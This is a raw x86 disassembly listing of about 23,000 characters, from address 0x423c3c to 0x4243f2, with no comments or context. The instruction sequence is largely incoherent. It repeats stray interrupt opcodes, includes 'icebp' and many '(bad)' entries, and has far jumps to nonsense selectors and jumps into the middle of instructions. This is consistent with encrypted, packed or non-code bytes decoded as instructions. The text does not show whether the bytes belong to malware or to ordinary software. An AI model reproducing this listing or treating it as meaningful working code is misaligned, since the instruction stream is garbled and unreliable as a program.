  423c3c:	lods   eax,DWORD PTR ds:[esi]
  423c3d:	sub    bl,dl
  423c3f:	jmp    0x423bd3
  423c41:	push   ebx
  423c42:	ror    ebp,cl
  423c44:	lea    ecx,ds:0xad3d12f
  423c4a:	jbe    0x423c59
  423c4c:	int    0x76
  423c4e:	push   ebp
  423c4f:	int    0x8d
  423c51:	push   ebp
  423c52:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c55:	or     al,0xd3
  423c57:	jmp    0x423beb
  423c59:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c5f:	lea    ecx,ds:0x52f7d43
  423c65:	pusha  
  423c66:	xchg   edx,eax
  423c67:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c6e:	or     eax,0x874576cd
  423c73:	jbe    0x423c45
  423c75:	or     ah,dh
  423c77:	cmp    eax,0x5d5d760a
  423c7c:	inc    ecx
  423c7d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c83:	leave  
  423c84:	jbe    0x423ceb
  423c86:	cmp    DWORD PTR [ecx],esp
  423c88:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c8e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c94:	int    0x76
  423c96:	cmp    eax,0x3b3d8dcd
  423c9b:	jns    0x423cd8
  423c9d:	or     al,0xd3
  423c9f:	lods   eax,DWORD PTR ds:[esi]
  423ca0:	sub    bl,dl
  423ca2:	jmp    0x423c36
  423ca4:	push   ebx
  423ca5:	ror    DWORD PTR [edx],cl
  423ca7:	jbe    0x423d26
  423ca9:	int    0x6d
  423cab:	jmp    0x423cb3
  423cad:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cb7:	add    BYTE PTR [ebx],cl
  423cb9:	and    DWORD PTR [esi-0x369232cb],eax
  423cbf:	push   es
  423cc0:	jl     0x423cc2
  423cc2:	add    BYTE PTR [eax],al
  423cc4:	mul    DWORD PTR [ecx]
  423cc6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423ccc:	int    0x76
  423cce:	icebp  
  423ccf:	int    0x8d
  423cd1:	icebp  
  423cd2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cd5:	or     al,0xd3
  423cd7:	lods   eax,DWORD PTR ds:[esi]
  423cd8:	sub    bl,dl
  423cda:	jmp    0x423c6e
  423cdc:	push   ebx
  423cdd:	ror    ebp,cl
  423cdf:	lea    edi,[ebp+0x2f]
  423ce2:	rcl    ebx,1
  423ce4:	int    0x8d
  423ce6:	pop    ebp
  423ce7:	retf   0x8884
  423cea:	or     DWORD PTR [esi-0x1f],esi
  423ced:	int    0x6d
  423cef:	int    0x76
  423cf1:	icebp  
  423cf2:	int    0x8d
  423cf4:	icebp  
  423cf5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cf8:	jns    0x423ccd
  423cfa:	jmp    0x423c8e
  423cfc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d02:	lea    edi,[ebp+0x2f]
  423d05:	rcl    ebx,1
  423d07:	int    0x8d
  423d09:	gs int 0x96
  423d0c:	cmp    ecx,DWORD PTR gs:[edi]
  423d0f:	cmp    edx,ebp
  423d11:	shl    edx,cl
  423d13:	sub    bl,dl
  423d15:	repz xchg edx,eax
  423d17:	push   ebx
  423d18:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d1e:	das    
  423d1f:	pop    ecx
  423d20:	dec    esp
  423d21:	mov    ch,cl
  423d23:	push   es
  423d24:	mov    WORD PTR [eax],es
  423d26:	add    BYTE PTR [eax],al
  423d28:	int    0x17
  423d2a:	mov    WORD PTR [eax],es
  423d2c:	add    BYTE PTR [eax],al
  423d2e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d31:	aad    0xd3
  423d33:	lods   eax,DWORD PTR ds:[esi]
  423d34:	sub    bl,dl
  423d36:	repz xchg edx,eax
  423d38:	push   ebx
  423d39:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d3f:	loope  0x423d7c
  423d41:	jge    0x423d4c
  423d43:	(bad)  
  423d44:	loope  0x423d13
  423d46:	ins    DWORD PTR es:[edi],dx
  423d47:	retf   0xe176
  423d4a:	int    0x8d
  423d4c:	icebp  
  423d4d:	int    0x96
  423d4f:	icebp  
  423d50:	cmp    ecx,DWORD PTR [edi]
  423d52:	cmp    edx,ebp
  423d54:	shl    ebx,cl
  423d56:	xchg   edx,eax
  423d57:	shl    edx,cl
  423d59:	sub    BYTE PTR [ebx+0x13],dl
  423d5c:	int    0x96
  423d5e:	jge    0x423d8f
  423d60:	rcl    DWORD PTR [ebx],1
  423d62:	int    0x96
  423d64:	pop    ebp
  423d65:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d6c:	icebp  
  423d6d:	int    0x8d
  423d6f:	icebp  
  423d70:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d73:	or     al,0xd3
  423d75:	lods   eax,DWORD PTR ds:[esi]
  423d76:	sub    bl,dl
  423d78:	jmp    0x423d0c
  423d7a:	push   ebx
  423d7b:	ror    ebp,cl
  423d7d:	lea    edi,[ebp+0x2f]
  423d80:	rcl    ebx,1
  423d82:	int    0x8d
  423d84:	pop    ebp
  423d85:	retf   0x8884
  423d88:	or     DWORD PTR [esi-0x1f],esi
  423d8b:	int    0x6d
  423d8d:	int    0x76
  423d8f:	icebp  
  423d90:	int    0x8d
  423d92:	icebp  
  423d93:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d96:	lods   eax,DWORD PTR ds:[esi]
  423d97:	sub    BYTE PTR [ebx],bh
  423d99:	or     al,0xd3
  423d9b:	jmp    0x423d2f
  423d9d:	push   ebx
  423d9e:	ror    ebp,cl
  423da0:	lea    edi,[ebp+0x2f]
  423da3:	rcl    ebx,1
  423da5:	int    0x8d
  423da7:	ins    DWORD PTR es:[edi],dx
  423da8:	int    0x96
  423daa:	ins    DWORD PTR es:[edi],dx
  423dab:	cmp    ecx,DWORD PTR [edi]
  423dad:	cmp    edx,ebp
  423daf:	shl    edx,cl
  423db1:	sub    bl,dl
  423db3:	repz xchg edx,eax
  423db5:	push   ebx
  423db6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dbc:	das    
  423dbd:	pop    ecx
  423dbe:	dec    esp
  423dbf:	mov    ch,cl
  423dc1:	push   es
  423dc2:	jl     0x423dc4
  423dc4:	add    BYTE PTR [eax],al
  423dc6:	int    0x17
  423dc8:	jl     0x423dca
  423dca:	add    BYTE PTR [eax],al
  423dcc:	cmp    edi,DWORD PTR [ecx+0x3b]
  423dcf:	aad    0xd3
  423dd1:	lods   eax,DWORD PTR ds:[esi]
  423dd2:	sub    bl,dl
  423dd4:	repz xchg edx,eax
  423dd6:	push   ebx
  423dd7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423ddd:	loope  0x423e1a
  423ddf:	jge    0x423dea
  423de1:	(bad)  
  423de2:	loope  0x423db1
  423de4:	ins    DWORD PTR es:[edi],dx
  423de5:	retf   0xe176
  423de8:	int    0x8d
  423dea:	icebp  
  423deb:	int    0x96
  423ded:	icebp  
  423dee:	cmp    ecx,DWORD PTR [edi]
  423df0:	cmp    edx,ebp
  423df2:	shl    ebx,cl
  423df4:	xchg   edx,eax
  423df5:	shl    edx,cl
  423df7:	sub    BYTE PTR [ebx+0x13],dl
  423dfa:	int    0x96
  423dfc:	jge    0x423e2d
  423dfe:	rcl    DWORD PTR [ebx],1
  423e00:	int    0x96
  423e02:	pop    ebp
  423e03:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e0a:	and    eax,0x3b258dcd
  423e0f:	or     al,0x3b
  423e11:	jns    0x423de6
  423e13:	jmp    0x423da7
  423e15:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e1b:	lea    ebp,[ebp-0x33]
  423e1e:	xchg   esi,eax
  423e1f:	ins    DWORD PTR es:[edi],dx
  423e20:	cmp    ecx,DWORD PTR [edi]
  423e22:	cmp    edx,ebp
  423e24:	shl    edx,cl
  423e26:	sub    bl,dl
  423e28:	repz xchg edx,eax
  423e2a:	push   ebx
  423e2b:	adc    ebp,DWORD PTR [edi]
  423e2d:	rcl    ebx,1
  423e2f:	xchg   DWORD PTR [esi+0x7d],esi
  423e32:	or     dh,BYTE PTR [esi+0x7d]
  423e35:	int    0x76
  423e37:	jge    0x423e06
  423e39:	lea    ecx,ds:0xb2f7d43
  423e3f:	(bad)  
  423e40:	inc    DWORD PTR [eax]
  423e42:	add    ch,cl
  423e44:	jbe    0x423eb3
  423e46:	int    0x8d
  423e48:	ins    DWORD PTR es:[edi],dx
  423e49:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e4c:	jmp    0x423de0
  423e4e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e51:	lods   eax,DWORD PTR ds:[esi]
  423e52:	sub    BYTE PTR [ebx-0x2d],dl
  423e55:	int    0x8d
  423e57:	or     eax,0xcdd3d12f
  423e5c:	lea    edi,ds:0xf2d30f3b
  423e62:	sub    BYTE PTR [ebx-0x2d],dl
  423e65:	int    0x8d
  423e67:	cmp    eax,0xebd30c3b
  423e6c:	xchg   edx,eax
  423e6d:	push   ebx
  423e6e:	ror    DWORD PTR [edx],cl
  423e70:	jbe    0x423ed7
  423e72:	int    0x76
  423e74:	popf   
  423e75:	int    0x8d
  423e77:	popf   
  423e78:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e7b:	jmp    0x423e0f
  423e7d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e80:	lods   eax,DWORD PTR ds:[esi]
  423e81:	sub    BYTE PTR [ebx-0x2d],dl
  423e84:	int    0x8d
  423e86:	popf   
  423e87:	int    0x96
  423e89:	popf   
  423e8a:	cmp    ecx,DWORD PTR [edi]
  423e8c:	shl    edx,cl
  423e8e:	sub    BYTE PTR [ebx],bh
  423e90:	aad    0xd3
  423e92:	repz xchg edx,eax
  423e94:	push   ebx
  423e95:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e9b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423ea1:	in     al,dx
  423ea2:	sbb    al,0xcd
  423ea4:	jbe    0x423e43
  423ea6:	int    0x8d
  423ea8:	popf   
  423ea9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eac:	or     al,0xd3
  423eae:	lods   eax,DWORD PTR ds:[esi]
  423eaf:	sub    bl,dl
  423eb1:	jmp    0x423e45
  423eb3:	push   ebx
  423eb4:	rol    DWORD PTR [edi+0x760a4576],cl
  423eba:	inc    ebp
  423ebb:	int    0x76
  423ebd:	popf   
  423ebe:	int    0x8d
  423ec0:	popf   
  423ec1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ec4:	lods   eax,DWORD PTR ds:[esi]
  423ec5:	sub    BYTE PTR [ebx],bh
  423ec7:	or     al,0xd3
  423ec9:	jmp    0x423e5d
  423ecb:	push   ebx
  423ecc:	ror    ebp,cl
  423ece:	lea    ebx,ds:0x76cd7d33
  423ed4:	popf   
  423ed5:	int    0x96
  423ed7:	popf   
  423ed8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423edb:	aad    0xd3
  423edd:	repz xchg edx,eax
  423edf:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ee5:	xchg   esi,eax
  423ee6:	inc    ebp
  423ee7:	das    
  423ee8:	rcl    edx,1
  423eea:	inc    ebx
  423eeb:	shr    DWORD PTR [edi],cl
  423eed:	pop    es
  423eee:	adc    ebp,edi
  423ef0:	add    BYTE PTR [eax],al
  423ef2:	int    0x76
  423ef4:	mov    BYTE PTR [eax],al
  423ef6:	(bad)  
  423ef7:	dec    esp
  423ef8:	iret   
  423ef9:	jbe    0x423eb8
  423efb:	add    dh,dl
  423efd:	mov    BYTE PTR [eax-0x33],dh
  423f00:	jbe    0x423e8a
  423f02:	int    0x1
  423f04:	xchg   ebp,eax
  423f05:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f0f:	icebp  
  423f10:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f1a:	jne    0x423ed9
  423f1c:	test   al,0x88
  423f1e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f25:	stc    
  423f26:	int    0x8d
  423f28:	stc    
  423f29:	cmp    eax,ebp
  423f2b:	cmp    ecx,DWORD PTR [edi]
  423f2d:	shl    edx,cl
  423f2f:	sub    bl,dl
  423f31:	mov    ebp,0xcdd35392
  423f36:	lea    esi,[ebp+0x43]
  423f39:	rcl    esp,cl
  423f3b:	push   esi
  423f3c:	int    0x76
  423f3e:	mov    ch,cl
  423f40:	lea    ebp,ds:0xcd2d96cd
  423f46:	add    DWORD PTR [ecx],edx
  423f48:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f52:	shr    edx,cl
  423f54:	sub    BYTE PTR [ebx+0x13],dl
  423f57:	jno    0x423f26
  423f59:	(bad)  
  423f5a:	stc    
  423f5b:	int    0x96
  423f5d:	stc    
  423f5e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f61:	cdq    
  423f62:	shr    ebx,cl
  423f64:	xchg   edx,eax
  423f65:	shr    edx,cl
  423f67:	sub    BYTE PTR [ebx+0x13],dl
  423f6a:	jno    0x423f6c
  423f6c:	(bad)  
  423f6d:	jne    0x423f6f
  423f6f:	jo     0x423f8d
  423f71:	stos   BYTE PTR es:[edi],al
  423f72:	test   al,0x63
  423f74:	retf   
  423f75:	ror    BYTE PTR [eax-0x12326980],cl
  423f7b:	add    al,0xed
  423f7d:	and    al,0x98
  423f7f:	int    0x11
  423f81:	int    0x12
  423f83:	sub    eax,0x4808081
  423f88:	pop    esp
  423f89:	sub    BYTE PTR [edi],0x5
  423f8c:	dec    edx
  423f8d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f97:	add    BYTE PTR [esi],0xf7
  423f9a:	das    
  423f9b:	add    eax,0x80808003
  423fa0:	int    0x7
  423fa2:	or     DWORD PTR [eax+0x6d068080],eax
  423fa8:	das    
  423fa9:	add    eax,0x808080e9
  423fae:	add    al,0x69
  423fb0:	int3   
  423fb1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423fb8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fbf:	add    eax,0x808080e3
  423fc4:	int    0xc1
  423fc6:	and    eax,0x4808081
  423fcb:	mov    dh,0x11
  423fcd:	or     ch,0x13
  423fd0:	xor    ecx,DWORD PTR [esi-0x79]
  423fd3:	shr    BYTE PTR [edi],cl
  423fd5:	mov    ebx,0x8d0a4c70
  423fda:	mov    ch,0x2f
  423fdc:	mov    ebx,0x13874e7c
  423fe1:	das    
  423fe2:	add    eax,0x80808049
  423fe7:	iret   
  423fe8:	jl     0x423ffe
  423fea:	pop    ebx
  423feb:	or     cl,BYTE PTR [ebp+0x69bd]
  423ff1:	add    BYTE PTR [ebx-0x2baef966],al
  423ff7:	or     ebp,0x31
  423ffa:	add    al,0xb6
  423ffc:	cmc    
  423ffd:	sub    BYTE PTR [ebx],0x99
  424000:	xchg   ecx,esi
  424002:	das    
  424003:	mov    ebx,0xbb2f4ee0
  424008:	mov    al,ds:0xd4fc874c
  42400d:	mov    esi,0xa148acf
  424012:	(bad)  
  424013:	in     eax,dx
  424014:	push   es
  424015:	push   ecx
  424016:	aam    0x6e
  424018:	int    0x89
  42401a:	add    al,0xb6
  42401c:	stc    
  42401d:	sub    BYTE PTR [ebx],0xf
  424020:	xchg   DWORD PTR [ebp+0x2f],edi
  424023:	mov    ebx,0xbb2f4ede
  424028:	sahf   
  424029:	dec    esp
  42402a:	xchg   esp,edi
  42402c:	aam    0x33
  42402e:	iret   
  42402f:	ficom  WORD PTR [edx+ecx*1]
  424032:	out    0xfd,al
  424034:	int    0xe6
  424036:	std    
  424037:	int    0x6a
  424039:	push   es
  42403a:	add    ah,dl
  42403c:	xchg   ch,cl
  42403e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42403f:	mov    ch,0x81
  424041:	and    al,0x8b
  424043:	das    
  424044:	mov    ebx,0xbb2f4ede
  424049:	sahf   
  42404a:	dec    esp
  42404b:	add    BYTE PTR [esi-0x7],dh
  42404e:	add    al,0x76
  424050:	std    
  424051:	mov    BYTE PTR [edi-0x619a104],al
  424057:	sbb    ch,0x2f
  42405a:	mov    ebx,0xbb2f4ee0
  42405f:	mov    al,ds:0xed8dcd4c
  424064:	add    BYTE PTR [esi-0xb],dh
  424067:	add    al,0xd3
  424069:	mov    BYTE PTR [edi-0x1272f504],al
  42406f:	pop    esi
  424070:	out    0xf5,al
  424072:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424079:	jo     0x4240c9
  42407b:	das    
  42407c:	mov    ebx,0x76004cdc
  424081:	adc    DWORD PTR [ebx+edx*8],eax
  424084:	mov    BYTE PTR [edi-0x4272f527],al
  42408a:	pop    esi
  42408b:	xchg   esi,eax
  42408c:	adc    DWORD PTR [edi],ebp
  42408e:	or     ebp,DWORD PTR [esi-0x56000000]
  424094:	arpl   WORD PTR [ebx],di
  424096:	ins    DWORD PTR es:[edi],dx
  424097:	ins    BYTE PTR es:[edi],dx
  424098:	in     al,dx
  424099:	xchg   edx,eax
  42409a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42409d:	retf   
  42409e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240a4:	sub    eax,0xcd808081
  4240a9:	jbe    0x4240f7
  4240ab:	add    al,0xed
  4240ad:	xor    BYTE PTR [ebx+0x3b],bl
  4240b0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240b6:	add    eax,0x8080800b
  4240bb:	inc    ebx
  4240bc:	(bad)
  4240bf:	pop    esi
  4240c0:	pushf  
  4240c1:	(bad)  
  4240c3:	test   DWORD PTR [ebx],edi
  4240c5:	ins    DWORD PTR es:[edi],dx
  4240c6:	ins    BYTE PTR es:[edi],dx
  4240c7:	in     al,dx
  4240c8:	fmul   st,st(5)
  4240ca:	ins    BYTE PTR es:[edi],dx
  4240cb:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240d1:	and    al,0xcd
  4240d3:	jo     0x424109
  4240d5:	int    0x90
  4240d7:	adc    al,0xcd
  4240d9:	fcomp  QWORD PTR [edi+eax*4]
  4240dc:	lea    ecx,[eax+0xa889687]
  4240e2:	(bad)  
  4240e3:	std    
  4240e4:	inc    ebx
  4240e5:	clc    
  4240e6:	jnp    0x42406f
  4240e8:	or     ah,dh
  4240ea:	std    
  4240eb:	or     ah,BYTE PTR [esi-0x259a107]
  4240f1:	fsub   st,st(3)
  4240f3:	inc    ebx
  4240f4:	pushf  
  4240f5:	adc    al,0x77
  4240f7:	xchg   BYTE PTR [edi],ch
  4240f9:	mov    ebx,0x92eca054
  4240fe:	int    0xf4
  424100:	iret   
  424101:	push   esp
  424102:	ror    ebp,0x68
  424105:	push   es
  424106:	add    ah,dl
  424108:	ds xchg esi,esp
  42410b:	mov    BYTE PTR [edx],cl
  42410d:	out    0x11,al
  42410f:	inc    ebx
  424110:	stc    
  424111:	fdiv   DWORD PTR [eax]
  424113:	int    0xa6
  424115:	dec    esp
  424116:	int    0x63
  424118:	in     al,0x87
  42411a:	popf   
  42411b:	inc    ebx
  42411c:	cld    
  42411d:	ja     0x4240a3
  42411f:	int    0x58
  424121:	in     al,dx
  424122:	mov    BYTE PTR [ebx],dh
  424124:	out    0x88,al
  424126:	or     ch,BYTE PTR [eax-0x33]
  424129:	(bad)  
  42412a:	adc    DWORD PTR [esi],eax
  42412c:	not    esp
  42412e:	dec    esi
  42412f:	int    0xa6
  424131:	stc    
  424132:	dec    ebx
  424133:	or     ah,BYTE PTR [esi-0x259bc07]
  424139:	sbb    BYTE PTR [ebp-0x14],0x8
  42413d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424140:	test   al,0x63
  424142:	retf   
  424143:	ror    BYTE PTR [eax-0x12326980],cl
  424149:	add    al,0xed
  42414b:	push   eax
  42414c:	pop    ebx
  42414d:	cwde   
  42414e:	pop    ebp
  42414f:	dec    ecx
  424150:	and    DWORD PTR [esi-0x289f5cb],eax
  424156:	leave  
  424157:	jbe    0x424152
  424159:	inc    ecx
  42415a:	and    DWORD PTR [esi-0x27232cb],eax
  424160:	int    0xa6
  424162:	std    
  424163:	call   0x3b81:0x90cfffc0
  42416a:	psrlq  mm5,mm3
  42416d:	xchg   edx,eax
  42416e:	stos   BYTE PTR es:[edi],al
  42416f:	cmp    esp,ecx
  424171:	shl    ebp,cl
  424173:	sub    BYTE PTR [ebx+0xc],dl
  424176:	or     cl,BYTE PTR [ebp-0x2723243]
  42417c:	int    0x8d
  42417e:	std    
  42417f:	int    0x8d
  424181:	std    
  424182:	int    0x8d
  424184:	std    
  424185:	int    0x8d
  424187:	std    
  424188:	int    0x8d
  42418a:	std    
  42418b:	int    0x8d
  42418d:	std    
  42418e:	int    0x8d
  424190:	std    
  424191:	int    0x8d
  424193:	std    
  424194:	int    0x8d
  424196:	std    
  424197:	leave  
  424198:	jbe    0x4241ab
  42419a:	fadd   st,st(5)
  42419c:	loope  0x4241f3
  42419e:	int    0x8d
  4241a0:	std    
  4241a1:	int    0xa6
  4241a3:	std    
  4241a4:	cmp    esp,ecx
  4241a6:	cmp    ecx,DWORD PTR [edi]
  4241a8:	shl    ebp,cl
  4241aa:	sub    bl,dl
  4241ac:	jmp    0x424140
  4241ae:	push   ebx
  4241af:	or     al,0xcd
  4241b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241b2:	dec    esp
  4241b3:	int    0x9f
  4241b5:	sub    eax,0x43808081
  4241ba:	push   ebx
  4241bb:	das    
  4241bc:	add    eax,0x80808717
  4241c1:	int    0x8d
  4241c3:	std    
  4241c4:	int    0xa6
  4241c6:	std    
  4241c7:	cmp    ecx,DWORD PTR [edi]
  4241c9:	cmp    esp,ecx
  4241cb:	shr    ebx,cl
  4241cd:	xchg   edx,eax
  4241ce:	shl    ebp,cl
  4241d0:	sub    BYTE PTR [ebx+0xc],dl
  4241d3:	inc    ebx
  4241d4:	adc    ebp,DWORD PTR [edi]
  4241d6:	add    eax,0x8080877f
  4241db:	int    0xca
  4241dd:	add    DWORD PTR [eax-0x69327f80],eax
  4241e3:	std    
  4241e4:	int    0xa6
  4241e6:	std    
  4241e7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241ed:	xchg   edx,eax
  4241ee:	shl    ebp,cl
  4241f0:	sub    BYTE PTR [ebx-0x2b],dl
  4241f3:	inc    ebx
  4241f4:	adc    ebp,DWORD PTR [edi]
  4241f6:	add    eax,0x8080875b
  4241fb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424201:	int    0xf1
  424203:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424209:	shl    ebx,cl
  42420b:	xchg   edx,eax
  42420c:	shl    ebp,cl
  42420e:	sub    BYTE PTR [ebx-0x2b],dl
  424211:	or     dl,BYTE PTR [esi+0x1196cd11]
  424217:	inc    ebx
  424218:	icebp  
  424219:	aam    0x26
  42421b:	int    0x76
  42421d:	std    
  42421e:	int    0x96
  424220:	std    
  424221:	cmp    ebx,ecx
  424223:	cmp    edi,DWORD PTR [ecx-0x2d]
  424226:	jmp    0xd253:0x92bdd328
  42422d:	int    0x96
  42422f:	adc    DWORD PTR [ebx-0x26],esi
  424232:	adc    al,0x5e
  424234:	test   BYTE PTR [edx-0x2a],cl
  424237:	xor    cl,ch
  424239:	jbe    0x424238
  42423b:	int    0x96
  42423d:	std    
  42423e:	cmp    ebx,ecx
  424240:	cmp    edi,DWORD PTR [ecx-0x2d]
  424243:	jmp    0xd253:0x92bdd328
  42424a:	int    0x96
  42424c:	adc    DWORD PTR [ebx-0x26],esi
  42424f:	adc    al,0x5e
  424251:	je     0x42429d
  424253:	xor    BYTE PTR [edi],ch
  424255:	add    eax,0x808092df
  42425a:	int    0x76
  42425c:	std    
  42425d:	int    0x76
  42425f:	std    
  424260:	int    0xa6
  424262:	std    
  424263:	int    0x76
  424265:	std    
  424266:	cmp    ecx,ecx
  424268:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42426e:	in     al,dx
  42426f:	xchg   edx,eax
  424270:	push   ebx
  424271:	popf   
  424272:	int    0x76
  424274:	adc    DWORD PTR [ebx+0x6d],esi
  424277:	adc    al,0x87
  424279:	ror    ebp,cl
  42427b:	jl     0x4242ad
  42427d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424283:	int    0x8d
  424285:	std    
  424286:	int    0x96
  424288:	std    
  424289:	cmp    ecx,DWORD PTR [edi]
  42428b:	cmp    ebx,ecx
  42428d:	shr    ebx,cl
  42428f:	xchg   edx,eax
  424290:	shr    edx,cl
  424292:	sub    BYTE PTR [ebx+0x13],dl
  424295:	int    0x96
  424297:	std    
  424298:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42429e:	lea    esi,[ebp+0x3bfd8dcd]
  4242a4:	cdq    
  4242a5:	cmp    esi,eax
  4242a7:	shl    edx,cl
  4242a9:	sub    bl,dl
  4242ab:	repz xchg edx,eax
  4242ad:	push   ebx
  4242ae:	jecxz  0x42427d
  4242b0:	lea    esi,[ebp-0x792becbd]
  4242b6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242bc:	int    0x8d
  4242be:	std    
  4242bf:	int    0x96
  4242c1:	std    
  4242c2:	cmp    ecx,DWORD PTR [edi]
  4242c4:	cmp    ebx,ecx
  4242c6:	shr    ebx,cl
  4242c8:	xchg   edx,eax
  4242c9:	shr    edx,cl
  4242cb:	sub    BYTE PTR [ebx+0x13],dl
  4242ce:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242d2:	jbe    0x424271
  4242d4:	popa   
  4242d5:	and    DWORD PTR [esi-0x777278cb],eax
  4242db:	or     cl,BYTE PTR [ebp-0x32781313]
  4242e1:	(bad)  
  4242e2:	in     eax,dx
  4242e3:	int    0x76
  4242e5:	dec    esp
  4242e6:	int    0x1
  4242e8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ee:	xor    ch,cl
  4242f0:	jbe    0x42433e
  4242f2:	add    dh,dl
  4242f4:	in     eax,dx
  4242f5:	int    0x1
  4242f7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242fd:	dec    esp
  4242fe:	leave  
  4242ff:	jbe    0x4242a6
  424301:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424308:	dec    edx
  424309:	pop    ss
  42430a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424310:	xchg   esi,eax
  424311:	std    
  424312:	cmp    ecx,DWORD PTR [edi]
  424314:	cmp    ebx,ecx
  424316:	shr    ebx,cl
  424318:	xchg   edx,eax
  424319:	shr    edx,cl
  42431b:	sub    BYTE PTR [ebx+0x13],dl
  42431e:	or     dh,BYTE PTR [esi-0x4b]
  424321:	inc    ebx
  424322:	jge    0x4242fa
  424324:	pop    eax
  424325:	int    0x76
  424327:	stc    
  424328:	int    0x8d
  42432a:	stc    
  42432b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42432e:	lock shl edx,cl
  424331:	sub    bl,dl
  424333:	mov    ebp,0xcdd35392
  424338:	lea    esp,[ebp+0x3ba596cd]
  42433e:	fnstcw WORD PTR [ebx]
  424340:	psrlq  mm5,mm2
  424343:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424349:	int    0x1
  42434b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424351:	xchg   edx,eax
  424352:	push   ebx
  424353:	jecxz  0x424384
  424355:	rcl    ebp,1
  424357:	bound  eax,QWORD PTR [eax]
  424359:	jo     0x42438f
  42435b:	int    0x76
  42435d:	std    
  42435e:	int    0x8d
  424360:	std    
  424361:	cmp    edi,DWORD PTR [ecx+0x3b]
  424364:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42436b:	push   ebx
  42436c:	rol    DWORD PTR [ebx+0x76],cl
  42436f:	mov    ch,0xd6
  424371:	and    ch,cl
  424373:	jbe    0x424312
  424375:	int    0x8d
  424377:	popf   
  424378:	cmp    esi,eax
  42437a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42437d:	mov    ebp,0x28f2d392
  424382:	push   ebx
  424383:	jge    0x4243c8
  424385:	fld    TBYTE PTR [edi]
  424387:	pop    es
  424388:	xchg   esp,eax
  424389:	add    BYTE PTR [eax],al
  42438b:	add    ch,cl
  42438d:	jbe    0x42438c
  42438f:	int    0x8d
  424391:	std    
  424392:	cmp    edi,DWORD PTR [ecx+0x3b]
  424395:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42439c:	push   ebx
  42439d:	rol    DWORD PTR [ebx+0x76],cl
  4243a0:	mov    ch,0xd6
  4243a2:	and    ch,cl
  4243a4:	jbe    0x42439f
  4243a6:	int    0x8d
  4243a8:	stc    
  4243a9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ac:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243b3:	push   ebx
  4243b4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243ba:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243c4:	leave  
  4243c5:	jbe    0x4243bc
  4243c7:	fdivr  st,st(4)
  4243c9:	sbb    al,0xb
  4243cb:	int    0xa6
  4243cd:	std    
  4243ce:	int    0x76
  4243d0:	std    
  4243d1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243d7:	xchg   edx,eax
  4243d8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243de:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243e4:	std    
  4243e5:	int    0x8d
  4243e7:	std    
  4243e8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243eb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243f2:	push   ebx
